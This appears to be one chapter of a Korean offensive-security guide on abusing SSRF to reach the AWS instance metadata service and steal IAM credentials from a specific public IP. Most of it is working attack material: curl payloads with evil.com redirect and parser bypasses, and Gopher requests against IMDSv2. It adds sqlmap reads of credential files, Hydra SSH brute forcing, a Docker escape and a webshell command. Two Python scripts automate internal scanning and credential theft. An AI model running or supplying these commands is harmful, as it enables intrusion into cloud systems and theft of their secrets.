# Phase 3: SSRF & AWS IMDS

SSRF (Server-Side Request Forgery) 취약점을 활용하여 AWS Instance Metadata Service에 접근하고 IAM 자격증명을 탈취하는 방법을 다룹니다.

## 📋 목차

1. [SSRF 기본 개념](#ssrf-기본-개념)
2. [AWS IMDS v1 공격](#aws-imds-v1-공격)
3. [AWS IMDS v2 우회](#aws-imds-v2-우회)
4. [IMDS 비활성화 시나리오](#imds-비활성화-시나리오)
5. [대체 공격 벡터](#대체-공격-벡터)

---

## SSRF 기본 개념

### SSRF란?

서버가 공격자가 지정한 URL로 요청을 보내도록 만드는 취약점입니다.

### 취약한 코드 예시

```php
<?php
// health.php - 취약한 코드
$url = $_GET['url'];
$response = file_get_contents($url);
echo $response;
?>
```

### SSRF 테스트

```bash
# 기본 SSRF 테스트
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254"

# 로컬 서비스 스캔
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:22"
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:3306"
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:6379"

# 내부 네트워크 스캔
curl "http://3.35.218.180/api/health.php?url=http://172.31.0.1"
curl "http://3.35.218.180/api/health.php?url=http://10.0.0.1"
```

### SSRF 우회 기법

```bash
# IP 인코딩 우회
curl "http://3.35.218.180/api/health.php?url=http://2130706433"  # 127.0.0.1의 10진수
curl "http://3.35.218.180/api/health.php?url=http://0x7f000001"  # 16진수
curl "http://3.35.218.180/api/health.php?url=http://0177.0.0.1"  # 8진수

# DNS 리바인딩
curl "http://3.35.218.180/api/health.php?url=http://metadata.aws.internal"

# URL 파서 우회
curl "http://3.35.218.180/api/health.php?url=http://evil.com@169.254.169.254"
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254#@evil.com"

# 리다이렉트 체인
# 1. evil.com에서 169.254.169.254로 리다이렉트하는 서버 구축
curl "http://3.35.218.180/api/health.php?url=http://evil.com/redirect"
```

---

## AWS IMDS v1 공격

### IMDS v1이란?

AWS EC2 인스턴스의 메타데이터를 제공하는 서비스로, 인증 없이 접근 가능합니다.

### 기본 정보 수집

```bash
# 메타데이터 서비스 확인
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/"

# 인스턴스 정보
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/instance-id"
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/hostname"
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/local-ipv4"
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/public-ipv4"

# 보안 그룹
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/security-groups"

# User-data (민감 정보 포함 가능)
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/user-data"
```

### IAM 자격증명 탈취

```bash
# IAM 역할 확인
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 역할 이름이 'EC2-WebServer-Role'이라고 가정
ROLE_NAME="EC2-WebServer-Role"

# 자격증명 탈취
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

### 탈취한 자격증명 사용

```bash
# 응답 예시:
{
  "AccessKeyId": "ASIASO4TYV4OP6B753PA",
  "SecretAccessKey": "QpUuKRQUdhXXeHRkSEUWFNLGa/wmn82Ym01/8c/a",
  "Token": "FwoGZXIvYXdzEBYaDHB...",
  "Expiration": "2025-11-26T12:00:00Z"
}

# AWS CLI 설정
export AWS_ACCESS_KEY_ID="ASIASO4TYV4OP6B753PA"
export AWS_SECRET_ACCESS_KEY="QpUuKRQUdhXXeHRkSEUWFNLGa/wmn82Ym01/8c/a"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDHB..."

# 자격증명 확인
aws sts get-caller-identity

# EC2 인스턴스 목록
aws ec2 describe-instances

# S3 버킷 목록
aws s3 ls

# SSM으로 명령 실행 (높은 권한 필요)
aws ssm send-command \
  --instance-ids i-1234567890abcdef0 \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["whoami"]'
```

---

## AWS IMDS v2 우회

### IMDS v2란?

세션 기반 인증이 추가된 보안 강화 버전으로, PUT 요청으로 토큰을 받아야 합니다.

### IMDS v2 공격 (SSRF로 가능한 경우)

```bash
# 1. 토큰 요청 (PUT 메소드 필요)
# 대부분의 SSRF는 GET만 지원하므로 실패

# Gopher 프로토콜 사용 (일부 환경에서 가능)
PAYLOAD=$(cat <<'EOF'
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

EOF
)

# URL 인코딩 후 gopher로 전송
curl "http://3.35.218.180/api/health.php?url=gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0a"
```

### IMDS v2 우회가 어려운 이유

```
1. PUT 메소드 필요 - 대부분의 SSRF는 GET만 지원
2. 커스텀 헤더 필요 - X-aws-ec2-metadata-token-ttl-seconds
3. 토큰을 받아서 다시 요청해야 함 - 2단계 공격 필요
```

---

## IMDS 비활성화 시나리오

### 시나리오 1: IMDS v1 비활성화, v2만 활성화

```bash
# 증상
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/"
# 응답: 401 Unauthorized

# 대응 방법
1. Gopher 프로토콜 시도 (PUT 메소드 지원 확인)
2. SSRF 엔드포인트가 POST를 지원하는지 확인
3. IMDS 포기, 다른 공격 벡터 찾기
```

### 시나리오 2: IMDS 완전 비활성화

```bash
# 증상
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/"
# 응답: Connection refused 또는 timeout

# 대응 방법
1. 로컬 서비스 스캔으로 전환
2. 내부 네트워크 스캔
3. 애플리케이션 취약점 공격
```

### 시나리오 3: SSRF 엔드포인트 자체가 삭제됨

```bash
# 증상
curl "http://3.35.218.180/api/health.php"
# 응답: 404 Not Found

# 대응 방법
1. 백업 파일 찾기 (.bak, .old)
2. 다른 SSRF 취약점 찾기
3. SQL Injection, File Upload 등 다른 공격으로 전환
```

---

## 대체 공격 벡터

### 1. 로컬 서비스 공격

```bash
# MySQL 접근 시도
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:3306"

# Redis 접근
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:6379"

# Elasticsearch
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:9200/_cat/indices"

# Docker API
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:2375/containers/json"
```

### 2. 내부 네트워크 스캔

```bash
# VPC 내부 IP 스캔 (172.31.0.0/16)
for i in {1..254}; do
    echo "[*] Scanning 172.31.0.$i"
    curl -s "http://3.35.218.180/api/health.php?url=http://172.31.0.$i" | grep -q "200 OK" && echo "[+] Found: 172.31.0.$i"
done

# RDS 엔드포인트 찾기
curl "http://3.35.218.180/api/health.php?url=http://mydb.c9akciq32.us-east-1.rds.amazonaws.com:3306"

# ElastiCache
curl "http://3.35.218.180/api/health.php?url=http://mycache.abc123.0001.use1.cache.amazonaws.com:6379"
```

### 3. 설정 파일에서 AWS 키 찾기

```bash
# SQL Injection으로 파일 읽기
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --file-read="/var/www/html/.env"

# 찾을 파일들
/var/www/html/.env
/var/www/html/config.php
/home/ec2-user/.aws/credentials
/root/.aws/credentials
/var/www/.aws/credentials
```

### 4. 애플리케이션 데이터베이스에서 AWS 키 추출

```bash
# DB 덤프 후 AWS 키 검색
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --dump-all --batch

# AWS 키 패턴 검색
grep -E "AKIA[0-9A-Z]{16}" dump.txt
grep -E "aws_access_key_id" dump.txt
```

### 5. 다른 EC2 인스턴스로 피봇

```bash
# 현재 인스턴스에서 내부 네트워크 스캔
nmap -sn 172.31.0.0/16

# SSH 브루트포스
hydra -L users.txt -P pass.txt ssh://172.31.0.10

# 다른 인스턴스의 IMDS 접근
ssh ec2-user@172.31.0.10 "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### 6. 컨테이너 환경 공격

```bash
# Docker 소켓 접근 확인
ls -la /var/run/docker.sock

# 컨테이너 탈출
docker run -v /:/host -it ubuntu chroot /host bash

# ECS Task Role 자격증명
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### 7. S3 버킷 직접 공격

```bash
# 퍼블릭 버킷 찾기
aws s3 ls s3://company-backup --no-sign-request
aws s3 ls s3://company-logs --no-sign-request

# ACL 잘못된 버킷
aws s3api get-bucket-acl --bucket company-backup

# 버킷 정책 확인
aws s3api get-bucket-policy --bucket company-backup
```

### 8. 애플리케이션 로직 악용

```bash
# 파일 업로드를 통한 AWS CLI 설치
curl -X POST http://3.35.218.180/upload.php \
  -F "file=@awscli-installer.zip"

# Webshell을 통한 AWS 명령 실행
curl "http://3.35.218.180/shell.php?cmd=aws s3 ls"

# Cron job을 통한 AWS 키 추출
echo "* * * * * aws sts get-caller-identity > /tmp/out.txt" | crontab -
```

---

## SSRF 자동화 스크립트

### 내부 네트워크 스캔 자동화

```python
#!/usr/bin/env python3
# ssrf_internal_scan.py

import requests
import concurrent.futures

TARGET = "http://3.35.218.180/api/health.php"
INTERNAL_SUBNETS = [
    "172.31.0.0/24",
    "10.0.0.0/24",
    "192.168.1.0/24"
]
PORTS = [22, 80, 443, 3306, 6379, 9200, 27017]

def check_ssrf(ip, port):
    try:
        url = f"{TARGET}?url=http://{ip}:{port}"
        response = requests.get(url, timeout=5)

        if response.status_code == 200 and len(response.text) > 0:
            print(f"[+] FOUND: {ip}:{port}")
            print(f"    Response: {response.text[:100]}")
            return True
    except:
        pass
    return False

def scan_subnet(subnet):
    import ipaddress
    network = ipaddress.ip_network(subnet)

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for ip in network.hosts():
            for port in PORTS:
                futures.append(executor.submit(check_ssrf, str(ip), port))

        concurrent.futures.wait(futures)

if __name__ == "__main__":
    for subnet in INTERNAL_SUBNETS:
        print(f"[*] Scanning {subnet}")
        scan_subnet(subnet)
```

### IMDS 완전 자동화

```python
#!/usr/bin/env python3
# imds_exploit.py

import requests
import json

class IMDSExploiter:
    def __init__(self, ssrf_url):
        self.ssrf_url = ssrf_url
        self.base_imds = "http://169.254.169.254/latest/meta-data"

    def ssrf_get(self, path):
        url = f"{self.ssrf_url}?url={self.base_imds}{path}"
        try:
            response = requests.get(url, timeout=10)
            return response.text
        except:
            return None

    def get_iam_role(self):
        roles = self.ssrf_get("/iam/security-credentials/")
        if roles:
            return roles.strip().split('\n')[0]
        return None

    def get_credentials(self):
        role_name = self.get_iam_role()
        if not role_name:
            print("[-] No IAM role found")
            return None

        print(f"[+] Found IAM role: {role_name}")

        creds_json = self.ssrf_get(f"/iam/security-credentials/{role_name}")
        if creds_json:
            creds = json.loads(creds_json)
            print("[+] Credentials stolen:")
            print(f"    AccessKeyId: {creds['AccessKeyId']}")
            print(f"    SecretAccessKey: {creds['SecretAccessKey']}")
            print(f"    Token: {creds['Token'][:50]}...")
            return creds

        return None

    def get_metadata(self):
        endpoints = [
            "/instance-id",
            "/hostname",
            "/local-ipv4",
            "/public-ipv4",
            "/security-groups"
        ]

        metadata = {}
        for endpoint in endpoints:
            data = self.ssrf_get(endpoint)
            if data:
                metadata[endpoint] = data
                print(f"[+] {endpoint}: {data}")

        return metadata

if __name__ == "__main__":
    exploiter = IMDSExploiter("http://3.35.218.180/api/health.php")

    print("[*] Fetching metadata...")
    metadata = exploiter.get_metadata()

    print("\n[*] Attempting to steal IAM credentials...")
    creds = exploiter.get_credentials()

    if creds:
        print("\n[+] Export these credentials:")
        print(f"export AWS_ACCESS_KEY_ID='{creds['AccessKeyId']}'")
        print(f"export AWS_SECRET_ACCESS_KEY='{creds['SecretAccessKey']}'")
        print(f"export AWS_SESSION_TOKEN='{creds['Token']}'")
```

---

## 공격 의사결정 트리

```
SSRF 취약점 발견
    ├── IMDS 접근 가능?
    │   ├── YES (v1) → IAM 자격증명 탈취 → AWS 리소스 공격
    │   ├── YES (v2만) → Gopher 프로토콜 시도 → 실패 시 다른 벡터
    │   └── NO (비활성화) → 아래로 이동
    │
    ├── 로컬 서비스 접근 가능?
    │   ├── MySQL → SQL Injection 시도
    │   ├── Redis → 데이터 추출 / RCE 시도
    │   └── Docker API → 컨테이너 탈출
    │
    ├── 내부 네트워크 스캔 가능?
    │   ├── RDS 발견 → DB 접근 시도
    │   ├── 다른 EC2 발견 → 피봇 공격
    │   └── S3 엔드포인트 → 버킷 공격
    │
    └── SSRF 불가능
        └── SQL Injection / File Upload 등 다른 공격
```

---

## 체크리스트

- [ ] SSRF 취약점 확인
- [ ] IMDS 버전 확인 (v1/v2/비활성화)
- [ ] IAM 역할 존재 여부 확인
- [ ] 자격증명 탈취 시도
- [ ] 로컬 서비스 스캔 (MySQL, Redis, etc.)
- [ ] 내부 네트워크 스캔 (172.31.0.0/16)
- [ ] RDS, ElastiCache 엔드포인트 찾기
- [ ] 설정 파일에서 AWS 키 검색
- [ ] 애플리케이션 DB에서 AWS 키 추출
- [ ] Docker/ECS 환경 확인
- [ ] S3 버킷 직접 공격 시도

---

## 다음 단계

SSRF 또는 다른 방법으로 서버 접근 권한을 얻었다면:
1. Reverse Shell 구축 (Phase 4)
2. 권한 상승 (Phase 5)
3. AWS 리소스 추가 공격

[→ Phase 4: Reverse Shell로 이동](04_reverse_shell.md)
